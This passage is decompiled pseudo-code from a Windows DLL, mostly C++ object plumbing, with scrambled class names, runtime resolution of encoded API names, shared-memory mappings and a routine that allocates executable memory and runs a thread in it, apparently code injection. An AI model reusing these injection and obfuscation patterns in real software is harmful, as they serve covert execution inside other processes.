      LOBYTE(v19) = 0;
      sub_1002DFA4((int)&v12);
      if ( !v4 )
        goto LABEL_4;
    }
    if ( v5 > a1 )
    {
      v8 = v5 - a1;
      v6 = v4 + a1;
      sub_1002DC63(v15, (int)a2, v6, v8, v13);
      v9 = v6;
      LOBYTE(v19) = 1;
      sub_1002DFA4((int)v15);
    }
    if ( v10 )
    {
      sub_1002DC63(v15, (int)a2, v10, pExceptionObject[0], v9);
      LOBYTE(v19) = 1;
      sub_1002DFA4((int)v15);
    }
    else
    {
      sub_1002DBA8(v16, v9);
    }
    LOBYTE(v19) = 0;
    sub_1002DFA4((int)&v12);
  }
  else
  {
LABEL_4:
    v4 = (*(int (__thiscall **)(_DWORD *))(*a2[3] + 16))(a2[3]);
    if ( v4 + a1 > v18 )
    {
      sub_1002E3FC(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVXcyfvsawkyZkgVqxqXcyfvsawKyzkgvqxq_ezrqwlx_sr__);
    }
    (*(void (__thiscall **)(_DWORD *, unsigned int))(*a2[3] + 20))(a2[3], v4 + a1);
  }
  v19 = -1;
  sub_1002DEAE((int)v16);
  return v4;
}
// 1002E293: using guessed type int var_38[4];

//----- (1002E3FC) --------------------------------------------------------
_DWORD *__stdcall sub_1002E3FC(_DWORD *a1)
{
  *a1 = &unk_10094D94;
  sub_10016441(a1 + 1);
  sub_10018C8B(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10094D8C;
  return a1;
}
// 10094D8C: using guessed type int (__stdcall *off_10094D8C)(char);

//----- (1002E44C) --------------------------------------------------------
void __thiscall sub_1002E44C(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 1;
  sub_1002E4FA((int)(this + 1));
  sub_1001646C(v1);
}

//----- (1002E45E) --------------------------------------------------------
_DWORD *__thiscall sub_1002E45E(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10094D94;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 1, v4);
  }
  sub_10018CF7(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10094D8C;
  return this;
}
// 10094D8C: using guessed type int (__stdcall *off_10094D8C)(char);

//----- (1002E4CD) --------------------------------------------------------
_DWORD *__thiscall sub_1002E4CD(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  sub_1002E4FA((int)this);
  sub_1001646C(this);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1002E4FA) --------------------------------------------------------
int __stdcall sub_1002E4FA(int a1)
{
  return sub_10018D93(a1);
}

//----- (1002E51A) --------------------------------------------------------
void __stdcall sub_1002E51A(int a1, _DWORD *a2, int a3)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 12) + 4))(*(_DWORD *)(a1 + 12));
  sub_1002D981(v3, a2);
  sub_10019BCB((void **)&a2);
}

//----- (1002E554) --------------------------------------------------------
void __userpurge sub_1002E554(int *a1@<ebx>, _DWORD *a2, volatile LONG *lpAddend)
{
  _DWORD *v3; // esi
  unsigned int v4; // ecx
  unsigned int v5; // edi
  _DWORD *v6; // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-2Ch]
  _DWORD v8[5]; // [esp+10h] [ebp-18h] BYREF
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  sub_100171BE(a1, v8);
  LOBYTE(v9) = 1;
  v3 = a2;
  v4 = 13 * ((a2[6] + 21) / 0xDu);
  v5 = 13 * ((a2[4] + 21) / 0xDu);
  if ( v4 >= v5 )
  {
    if ( v4 > v5 )
      sub_1002E18C(v4 - v5, a2[7] + v5, a1);
  }
  else
  {
    sub_1002E18C(v4, a2[7], a1);
    v3[7] = sub_1002E293(v5, (_DWORD **)a1);
  }
  v8[2] = &v6;
  v7 = lpAddend;
  v6 = v3;
  InterlockedIncrement(lpAddend);
  LOBYTE(v9) = 1;
  sub_1002E51A((int)a1, v6, (int)v7);
  LOBYTE(v9) = 0;
  sub_100171F2(v8);
  v9 = -1;
  sub_10019BCB((void **)&a2);
}

//----- (1002E609) --------------------------------------------------------
int __stdcall sub_1002E609(int *a1, unsigned int a2)
{
  _DWORD v3[2]; // [esp+10h] [ebp-20h] BYREF
  void *v4[5]; // [esp+18h] [ebp-18h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  sub_100171BE(a1, v3);
  v5 = 0;
  sub_1002E062((int)a1, v4, a2);
  LOBYTE(v5) = 1;
  sub_1002E18C(13 * ((*((_DWORD *)v4[0] + 6) + 21) / 0xDu), *((_DWORD *)v4[0] + 7), a1);
  LOBYTE(v5) = 0;
  sub_10019BCB(v4);
  v5 = -1;
  return sub_100171F2(v3);
}
// 1002E609: using guessed type _DWORD var_20[2];

//----- (1002E679) --------------------------------------------------------
void __stdcall sub_1002E679(int *a1, _DWORD *a2, volatile LONG *lpAddend)
{
  _DWORD *v3; // esi
  unsigned int v4; // eax
  volatile LONG *v5; // ecx
  _DWORD *v6; // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-2Ch]
  _DWORD v8[5]; // [esp+10h] [ebp-18h] BYREF
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  sub_100171BE(a1, v8);
  LOBYTE(v9) = 1;
  v3 = a2;
  v4 = sub_1002E293(13 * ((a2[6] + 21) / 0xDu), (_DWORD **)a1);
  v5 = lpAddend;
  v3[7] = v4;
  v8[2] = &v6;
  v7 = v5;
  v6 = v3;
  InterlockedIncrement(v5);
  LOBYTE(v9) = 1;
  sub_1002E51A((int)a1, v6, (int)v7);
  LOBYTE(v9) = 0;
  sub_100171F2(v8);
  v9 = -1;
  sub_10019BCB((void **)&a2);
}

//----- (1002E6FE) --------------------------------------------------------
int __thiscall sub_1002E6FE(int this)
{
  int result; // eax

  result = sub_10017087((int *)(this + 16));
  if ( !*(_DWORD *)(this + 40) )
  {
    result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 24))(*(_DWORD *)(this + 12));
    if ( (_BYTE)result )
      result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 8))(*(_DWORD *)(this + 12));
  }
  ++*(_DWORD *)(this + 40);
  return result;
}

//----- (1002E757) --------------------------------------------------------
int __thiscall sub_1002E757(int this)
{
  if ( (*(_DWORD *)(this + 40))-- == 1 )
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 8))(*(_DWORD *)(this + 12));
  return sub_10017063(this + 16);
}

//----- (1002E7A0) --------------------------------------------------------
int __stdcall sub_1002E7A0(int a1, int a2)
{
  (*(void (__thiscall **)(_DWORD, int))(**(_DWORD **)(a1 + 12) + 36))(*(_DWORD *)(a1 + 12), a2);
  return a2;
}

//----- (1002E7DC) --------------------------------------------------------
_DWORD *__stdcall sub_1002E7DC(int a1, _DWORD *a2, int a3, int a4)
{
  unsigned int v4; // edi
  _DWORD *v5; // eax
  _DWORD v7[2]; // [esp+10h] [ebp-20h] BYREF
  void *v8; // [esp+18h] [ebp-18h] BYREF
  unsigned int v9; // [esp+1Ch] [ebp-14h]
  int v10; // [esp+20h] [ebp-10h]
  int v11; // [esp+2Ch] [ebp-4h]

  v10 = 0;
  v11 = 1;
  sub_100171BE((int *)a1, v7);
  LOBYTE(v11) = 2;
  v9 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 12) + 16))(*(_DWORD *)(a1 + 12));
  v4 = *(_DWORD *)(a3 + 28) + 13 * ((*(_DWORD *)(a3 + 24) + 21) / 0xDu);
  sub_10019B8C(a2, 0);
  v10 = 1;
  if ( v4 < v9 )
  {
    v5 = sub_1002E062(a1, &v8, v4);
    LOBYTE(v11) = 3;
    sub_10019BF9(v5, (int)a2);
    LOBYTE(v11) = 2;
    sub_10019BCB(&v8);
  }
  LOBYTE(v11) = 1;
  sub_100171F2(v7);
  LOBYTE(v11) = 0;
  sub_10019BCB((void **)&a3);
  return a2;
}
// 1002E7DC: using guessed type _DWORD var_20[2];

//----- (1002E885) --------------------------------------------------------
_DWORD *__stdcall sub_1002E885(_DWORD *a1, struct _SECURITY_ATTRIBUTES *a2, int a3, int a4)
{
  int v5[9]; // [esp+0h] [ebp-28h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  v6 = 0;
  v5[6] = (int)v5;
  *a1 = off_10094DAC;
  sub_1000CE26(v5, (int)&a3);
  LOBYTE(v6) = 0;
  sub_1002EEB0(a1 + 1, 4u, a2, v5[0], v5[1]);
  v6 = -1;
  sub_1000CE59(&a3);
  return a1;
}
// 10094DAC: using guessed type int (__thiscall *off_10094DAC[2])(void *Block, char);

//----- (1002E8DB) --------------------------------------------------------
_DWORD *__thiscall sub_1002E8DB(_DWORD *Block, char a2)
{
  sub_1002E8FA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002E8FA) --------------------------------------------------------
bool __thiscall sub_1002E8FA(_DWORD *this)
{
  *this = off_10094DAC;
  return sub_1002F012(this + 1);
}
// 10094DAC: using guessed type int (__thiscall *off_10094DAC[2])(void *Block, char);

//----- (1002E930) --------------------------------------------------------
int __thiscall sub_1002E930(void *this, int a2, int a3)
{
  sub_10016983(*(void **)(a3 + 12), a2, 0);
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a3, a2);
  return a2;
}

//----- (1002E97D) --------------------------------------------------------
int __thiscall sub_1002E97D(void *this, int a2, int a3)
{
  sub_10016983(*(void **)(a3 + 12), a2, 0);
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a3, a2);
  return a2;
}

//----- (1002E9C3) --------------------------------------------------------
_DWORD *__stdcall sub_1002E9C3(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10094DB0;
  return a1;
}
// 10094DB0: using guessed type int (__thiscall *off_10094DB0)(void *Block, char);

//----- (1002E9F1) --------------------------------------------------------
_DWORD *__thiscall sub_1002E9F1(_DWORD *Block, char a2)
{
  sub_1002EA10(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002EA10) --------------------------------------------------------
void __thiscall sub_1002EA10(_DWORD *this)
{
  *this = &off_10094DB0;
  sub_1001646C(this);
}
// 10094DB0: using guessed type int (__thiscall *off_10094DB0)(void *Block, char);

//----- (1002EA34) --------------------------------------------------------
_DWORD *__stdcall sub_1002EA34(_DWORD *a1, int a2)
{
  sub_10016441(a1);
  *a1 = &off_100947C4;
  a1[1] = a2;
  return a1;
}
// 100947C4: using guessed type int (__thiscall *off_100947C4)(void *Block, char);

//----- (1002EA6C) --------------------------------------------------------
int __stdcall sub_1002EA6C(int a1)
{
  wchar_t *v1; // eax
  int v2; // ecx
  wchar_t *v3; // eax
  int v4; // ecx
  char *v5; // eax
  int v7[2]; // [esp-10h] [ebp-34h] BYREF
  int v8[10]; // [esp-8h] [ebp-2Ch] BYREF
  int v9; // [esp+20h] [ebp-4h]

  v1 = (wchar_t *)sub_1000E943((int)&unk_100B6E88);
  v8[0] = v2;
  v8[7] = (int)v8;
  sub_1000CC20(v8, v1);
  v9 = 0;
  v3 = (wchar_t *)sub_1000E943((int)&unk_100B6ED0);
  v7[0] = v4;
  v8[6] = (int)v7;
  sub_1000CC20(v7, v3);
  v9 = -1;
  v5 = sub_1002481B(v7[0], v7[1], v8[0]);
  return ((int (__stdcall *)(_DWORD))v5)(*(_DWORD *)(a1 + 4));
}
// 1002EA82: variable 'v2' is possibly undefined
// 1002EA9D: variable 'v4' is possibly undefined

//----- (1002EACA) --------------------------------------------------------
void __thiscall sub_1002EACA(_DWORD *this)
{
  *this = &off_100947C4;
  sub_1001646C(this);
}
// 100947C4: using guessed type int (__thiscall *off_100947C4)(void *Block, char);

//----- (1002EAEE) --------------------------------------------------------
_DWORD *__stdcall sub_1002EAEE(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10094DB8;
  return a1;
}
// 10094DB8: using guessed type int (__thiscall *off_10094DB8)(void *Block, char);

//----- (1002EB1C) --------------------------------------------------------
_DWORD *__thiscall sub_1002EB1C(_DWORD *Block, char a2)
{
  sub_1002EB3B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002EB3B) --------------------------------------------------------
void __thiscall sub_1002EB3B(_DWORD *this)
{
  *this = &off_10094DB8;
  sub_1001646C(this);
}
// 10094DB8: using guessed type int (__thiscall *off_10094DB8)(void *Block, char);

//----- (1002EB5F) --------------------------------------------------------
_DWORD *__stdcall sub_1002EB5F(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093FDC;
  return a1;
}
// 10093FDC: using guessed type int (__thiscall *off_10093FDC)(void *Block, char);

//----- (1002EB8D) --------------------------------------------------------
void __thiscall sub_1002EB8D(_DWORD *this)
{
  *this = &off_10093FDC;
  sub_1001646C(this);
}
// 10093FDC: using guessed type int (__thiscall *off_10093FDC)(void *Block, char);

//----- (1002EBB1) --------------------------------------------------------
_DWORD *__stdcall sub_1002EBB1(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093FE4;
  return a1;
}
// 10093FE4: using guessed type int (__thiscall *off_10093FE4)(void *Block, char);

//----- (1002EBDF) --------------------------------------------------------
void __thiscall sub_1002EBDF(_DWORD *this)
{
  *this = &off_10093FE4;
  sub_1001646C(this);
}
// 10093FE4: using guessed type int (__thiscall *off_10093FE4)(void *Block, char);

//----- (1002EC03) --------------------------------------------------------
int __usercall sub_1002EC03@<eax>(int result@<eax>)
{
  if ( *(_BYTE *)result == 0xE9 )
    result += *(_DWORD *)(result + 1) + 5;
  return result;
}

//----- (1002EC10) --------------------------------------------------------
int __cdecl sub_1002EC10(int a1, int a2)
{
  void *v2; // eax
  int v3; // edx

  v2 = (void *)sub_1002EC03(a2);
  sub_10016983((void *)(v3 - a2), a1, v2);
  return a1;
}
// 1002EC2E: variable 'v3' is possibly undefined

//----- (1002EC4A) --------------------------------------------------------
DWORD __usercall sub_1002EC4A@<eax>(int a1@<edi>, _DWORD *a2, _DWORD *a3)
{
  void *v3; // esi
  _DWORD *v4; // eax
  int v5; // ecx
  DWORD v6; // esi
  int v8; // [esp+20h] [ebp-6Ch] BYREF
  int v9[3]; // [esp+24h] [ebp-68h] BYREF
  _DWORD v10[3]; // [esp+30h] [ebp-5Ch] BYREF
  int v11[5]; // [esp+3Ch] [ebp-50h] BYREF
  _DWORD v12[8]; // [esp+50h] [ebp-3Ch] BYREF
  int v13; // [esp+70h] [ebp-1Ch]
  char v14; // [esp+78h] [ebp-14h]
  int v15; // [esp+88h] [ebp-4h]

  v8 = 128;
  sub_1002785C((int)v10, &v8);
  v15 = 0;
  v3 = (void *)(4 - (a2[3] & 3));
  (*(void (__thiscall **)(int, _DWORD *, int, int, int))(*(_DWORD *)a1 + 44))(
    a1,
    v12,
    (int)v3 + a2[3] + a3[3],
    64,
    4096);
  LOBYTE(v15) = 1;
  sub_10028BB4(v12, a2);
  v4 = (_DWORD *)sub_10016983(v3, (int)v11, 0);
  LOBYTE(v15) = 6;
  sub_10028BB4(v12, v4);
  LOBYTE(v15) = 1;
  sub_10016B53(v11);
  sub_10028BB4(v12, a3);
  (*(void (__thiscall **)(int, int *, int, int, _DWORD, int))(*(_DWORD *)a1 + 56))(
    a1,
    v9,
    v13,
    (int)v3 + v13 + a2[3],
    0,
    60000);
  LOBYTE(v15) = 7;
  sub_10027909(v5, (int)v10);
  sub_10014E23((int)v9, 30000, 0);
  v14 = 1;
  v6 = sub_1000EA59(v9);
  LOBYTE(v15) = 1;
  sub_1000EA34(v9);
  LOBYTE(v15) = 0;
  sub_10028854((int)v12);
  v15 = -1;
  sub_10027930(v10);
  return v6;
}
// 1002ED31: variable 'v5' is possibly undefined
// 1002EC4A: using guessed type _DWORD var_5C[3];
// 1002EC4A: using guessed type _DWORD var_3C[8];
// 1002EC4A: using guessed type int var_50[5];
// 1002EC4A: using guessed type int var_68[3];

//----- (1002ED93) --------------------------------------------------------
char __cdecl sub_1002ED93(int a1, int a2, int a3)
{
  int *v3; // eax
  const WCHAR *v4; // edi
  HANDLE v5; // eax
  DWORD LastError; // eax
  DWORD v8; // [esp-8h] [ebp-40h]
  int CurrentProcessId; // [esp-4h] [ebp-3Ch]
  _DWORD pExceptionObject[2]; // [esp+10h] [ebp-28h] BYREF
  int v11[2]; // [esp+18h] [ebp-20h] BYREF
  int v12[2]; // [esp+20h] [ebp-18h] BYREF
  int v13; // [esp+28h] [ebp-10h]
  int v14; // [esp+34h] [ebp-4h]

  v13 = 0;
  v14 = 0;
  v3 = &a1;
  if ( (_BYTE)a3 )
  {
    v3 = sub_100142A3(v12, (int)&a1);
    LOBYTE(v14) = 1;
    v13 = 1;
  }
  sub_1000CE26(v11, (int)v3);
  v14 = 3;
  if ( (v13 & 1) != 0 )
  {
    v13 &= ~1u;
    sub_1000CE59(v12);
  }
  v4 = *(const WCHAR **)(v11[1] + 12);
  CurrentProcessId = GetCurrentProcessId();
  v8 = GetCurrentProcessId();
  v5 = OpenFileMappingW(4u, 0, v4);
  sub_10029136(v12, v5, 0, 0, v8, CurrentProcessId);
  LOBYTE(v14) = 4;
  if ( v12[1] )
  {
    LOBYTE(v14) = 3;
    sub_10014389(v12);
    LOBYTE(v14) = 0;
    sub_1000CE59(v11);
    v14 = -1;
    sub_1000CE59(&a1);
    return 1;
  }
  else
  {
    LastError = GetLastError();
    if ( LastError == 2 || LastError == 3 || LastError == 15 )
    {
      HIBYTE(a3) = 0;
    }
    else
    {
      if ( LastError != 5 && LastError != 32 && LastError != 33 )
      {
        sub_10016590(pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
      }
      HIBYTE(a3) = 1;
    }
    LOBYTE(v14) = 3;
    sub_10014389(v12);
    LOBYTE(v14) = 0;
    sub_1000CE59(v11);
    v14 = -1;
    sub_1000CE59(&a1);
    return HIBYTE(a3);
  }
}
// 1002ED93: using guessed type _DWORD pExceptionObject[2];

//----- (1002EEB0) --------------------------------------------------------
_DWORD *__stdcall sub_1002EEB0(
        _DWORD *a1,
        DWORD dwMaximumSizeLow,
        LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
        int a4,
        int a5)
{
  DWORD v5; // eax
  int *v6; // eax
  _DWORD *v7; // eax
  const WCHAR *v8; // esi
  HANDLE FileMappingW; // eax
  void *v10; // esi
  LPVOID v11; // eax
  DWORD v13; // [esp-8h] [ebp-44h]
  int CurrentProcessId; // [esp-4h] [ebp-40h]
  int v15; // [esp-4h] [ebp-40h]
  int pExceptionObject; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD v17[2]; // [esp+14h] [ebp-28h] BYREF
  int v18[2]; // [esp+1Ch] [ebp-20h] BYREF
  int v19[2]; // [esp+24h] [ebp-18h] BYREF
  int v20; // [esp+2Ch] [ebp-10h]
  int v21; // [esp+38h] [ebp-4h]
  struct _SECURITY_ATTRIBUTES *lpFileMappingAttributesa; // [esp+4Ch] [ebp+10h]

  v20 = 0;
  v21 = 0;
  *a1 = off_10094DC0;
  CurrentProcessId = GetCurrentProcessId();
  v5 = GetCurrentProcessId();
  sub_10029136(a1 + 1, (void *)0xFFFFFFFF, 0, 0, v5, CurrentProcessId);
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10029356(a1 + 3);
  LOBYTE(v21) = 2;
  v6 = &a4;
  if ( (_BYTE)lpFileMappingAttributes )
  {
    v6 = sub_100142A3(v18, (int)&a4);
    LOBYTE(v21) = 3;
    v20 = 1;
  }
  sub_1000CE26(v19, (int)v6);
  v21 = 5;
  if ( (v20 & 1) != 0 )
  {
    v20 &= ~1u;
    sub_1000CE59(v18);
  }
  v7 = sub_1001445F(v17);
  LOBYTE(v21) = 6;
  v8 = *(const WCHAR **)(v19[1] + 12);
  lpFileMappingAttributesa = *(struct _SECURITY_ATTRIBUTES **)(*v7 + 4);
  v15 = GetCurrentProcessId();
  v13 = GetCurrentProcessId();
  FileMappingW = CreateFileMappingW((HANDLE)0xFFFFFFFF, lpFileMappingAttributesa, 4u, 0, dwMaximumSizeLow, v8);
  sub_10015027(a1 + 1, FileMappingW, 0, 0, v13, v15);
  LOBYTE(v21) = 5;
  sub_100015D8(v17);
  v10 = (void *)a1[2];
  if ( !v10
    || (GetCurrentProcessId(),
        GetCurrentProcessId(),
        v11 = MapViewOfFile(v10, 0xF001Fu, 0, 0, dwMaximumSizeLow),
        sub_1002985A((int)(a1 + 3), (int)v11),
        !a1[4]) )
  {
    sub_100167F9(&pExceptionObject, 1);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  LOBYTE(v21) = 2;
  sub_1000CE59(v19);
  v21 = -1;
  sub_1000CE59(&a4);
  return a1;
}
// 10094DC0: using guessed type int (__thiscall *off_10094DC0[2])(void *Block, char);
// 1002EEB0: using guessed type _DWORD var_28[2];

//----- (1002EFF3) --------------------------------------------------------
_DWORD *__thiscall sub_1002EFF3(_DWORD *Block, char a2)
{
  sub_1002F012(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002F012) --------------------------------------------------------
bool __thiscall sub_1002F012(_DWORD *this)
{
  *this = off_10094DC0;
  sub_10029829(this + 3);
  return sub_10014389(this + 1);
}
// 10094DC0: using guessed type int (__thiscall *off_10094DC0[2])(void *Block, char);

//----- (1002F05E) --------------------------------------------------------
_DWORD *__thiscall sub_1002F05E(_DWORD *Block, char a2)
{
  *Block = &off_10094DC4;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094DC4: using guessed type int (__thiscall *off_10094DC4)(void *Block, char);

//----- (1002F085) --------------------------------------------------------
_DWORD *__userpurge sub_1002F085@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  sub_1001CE42(a1, a2);
  sub_10017D60(a2 + 8);
  return a2;
}

//----- (1002F0B5) --------------------------------------------------------
int __thiscall sub_1002F0B5(_DWORD *this, int a2)
{
  _DWORD *v2; // esi

  v2 = this + 8;
  (*(void (__thiscall **)(_DWORD *))(this[8] + 20))(this + 8);
  (*(void (__thiscall **)(_DWORD *, int))(*v2 + 36))(v2, a2);
  return a2;
}

//----- (1002F0F1) --------------------------------------------------------
bool sub_1002F0F1()
{
  return dword_100B6A4C == 10485760 || sub_10035989(0xA00000u);
}
// 100B6A4C: using guessed type int dword_100B6A4C;

//----- (1002F115) --------------------------------------------------------
int __fastcall sub_1002F115(int a1, _DWORD *a2)
{
  int *v3; // eax
  _DWORD *v4; // eax
  int v5; // esi
  _DWORD v7[17]; // [esp+10h] [ebp-68h] BYREF
  int v8[5]; // [esp+54h] [ebp-24h] BYREF
  int v9[3]; // [esp+68h] [ebp-10h] BYREF
  int v10; // [esp+74h] [ebp-4h]

  sub_1002F085(a2, v7);
  v10 = 0;
  sub_100373D2(v7, v7);
  v9[0] = -2069057649;
  v3 = (int *)sub_10016983((void *)4, (int)v8, v9);
  LOBYTE(v10) = 1;
  sub_10016B2F(v3, a1);
  LOBYTE(v10) = 0;
  sub_10016B53(v8);
  v4 = (_DWORD *)sub_1002F0B5(v7, (int)v8);
  LOBYTE(v10) = 2;
  sub_10016CD5(v4, a1);
  LOBYTE(v10) = 0;
  sub_10016B53(v8);
  v5 = *(_DWORD *)(a1 + 12);
  v10 = -1;
  sub_1002F1A6((int)v7);
  return v5;
}
// 1002F115: using guessed type _DWORD var_68[17];
// 1002F115: using guessed type int var_10[3];
// 1002F115: using guessed type int var_24[5];

//----- (1002F1A6) --------------------------------------------------------
void __stdcall sub_1002F1A6(int a1)
{
  sub_10017DC3(a1 + 32);
  sub_1001CE9F(a1);
}

//----- (1002F1D4) --------------------------------------------------------
int __fastcall sub_1002F1D4(int a1, int *a2)
{
  const void *v4; // eax
  _DWORD *v6; // eax
  int *v7; // eax
  int v8; // esi
  _DWORD v9[17]; // [esp+10h] [ebp-68h] BYREF
  int v10[5]; // [esp+54h] [ebp-24h] BYREF
  int v11[3]; // [esp+68h] [ebp-10h] BYREF
  int v12; // [esp+74h] [ebp-4h]

  v4 = (const void *)sub_10016C24(a2);
  memcpy(v11, v4, 4u);
  if ( v11[0] != -2069057649 )
    return 0;
  v6 = (_DWORD *)sub_10016DFF(a2[3] - 4, a2, (int)v10, 4);
  v12 = 0;
  sub_1002F085(v6, v9);
  LOBYTE(v12) = 2;
  sub_10016B53(v10);
  sub_10037551(v9, v9);
  v7 = (int *)sub_1002F0B5(v9, (int)v10);
  LOBYTE(v12) = 3;
  sub_10016B2F(v7, a1);
  LOBYTE(v12) = 2;
  sub_10016B53(v10);
  v8 = *(_DWORD *)(a1 + 12);
  v12 = -1;
  sub_1002F1A6((int)v9);
  return v8;
}
// 1002F1D4: using guessed type int var_24[5];
// 1002F1D4: using guessed type _DWORD var_68[17];

//----- (1002F278) --------------------------------------------------------
_DWORD *__stdcall sub_1002F278(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_1009401C;
  return a1;
}
// 1009401C: using guessed type int (__thiscall *off_1009401C)(void *Block, char);

//----- (1002F2A6) --------------------------------------------------------
void __thiscall sub_1002F2A6(_DWORD *this)
{
  *this = &off_1009401C;
  sub_1001646C(this);
}
// 1009401C: using guessed type int (__thiscall *off_1009401C)(void *Block, char);

//----- (1002F2CA) --------------------------------------------------------
int __stdcall sub_1002F2CA(int a1, int a2, char a3)
{
  int v3; // edx

  sub_1002F467(a1);
  *(_DWORD *)(v3 + 8) = a2;
  *(_DWORD *)v3 = &off_10094DCC;
  *(_BYTE *)(v3 + 12) = a3;
  return v3;
}
// 1002F2E6: variable 'v3' is possibly undefined
// 10094DCC: using guessed type int (__thiscall *off_10094DCC)(void *Block, char);

//----- (1002F303) --------------------------------------------------------
_BYTE *__thiscall sub_1002F303(_BYTE *Block, char a2)
{
  sub_1002F322(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002F322) --------------------------------------------------------
void __thiscall sub_1002F322(_BYTE *this)
{
  *(_DWORD *)this = &off_10094DCC;
  sub_1002F370(this);
  sub_1002F4B5(this);
}
// 10094DCC: using guessed type int (__thiscall *off_10094DCC)(void *Block, char);

//----- (1002F364) --------------------------------------------------------
int __thiscall sub_1002F364(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 24))(v1);
}

//----- (1002F370) --------------------------------------------------------
int __thiscall sub_1002F370(_BYTE *this)
{
  int result; // eax
  bool v3; // zf
  int v4; // eax

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 36))(this);
  if ( !(_BYTE)result )
  {
    v3 = this[12] == 0;
    this[4] = 1;
    if ( !v3 )
    {
      v4 = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 44))(this);
      return (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 32))(v4);
    }
  }
  return result;
}

//----- (1002F396) --------------------------------------------------------
int __thiscall sub_1002F396(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 16))(v1);
}

//----- (1002F3A6) --------------------------------------------------------
int __thiscall sub_1002F3A6(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 12))(v1);
}

//----- (1002F3B6) --------------------------------------------------------
int __thiscall sub_1002F3B6(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 28))(v1);
}

//----- (1002F3C2) --------------------------------------------------------
int __thiscall sub_1002F3C2(_DWORD *this)
{
  return this[2];
}

//----- (1002F3C6) --------------------------------------------------------
BOOL __thiscall sub_1002F3C6(void *this)
{
  int v2; // eax
  BOOL result; // eax

  result = 0;
  if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 48))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v2 + 40))(v2) )
      return 1;
  }
  return result;
}

//----- (1002F3ED) --------------------------------------------------------
int __thiscall sub_1002F3ED(void *this)
{
  int v2; // eax
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 40))(this) )
  {
    sub_100166E1(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 4))(v2);
}
// 1002F3ED: using guessed type _DWORD pExceptionObject[2];

//----- (1002F426) --------------------------------------------------------
int __thiscall sub_1002F426(void *this, int a2, int a3)
{
  int v4; // eax
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 40))(this) )
  {
    sub_100166E1(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
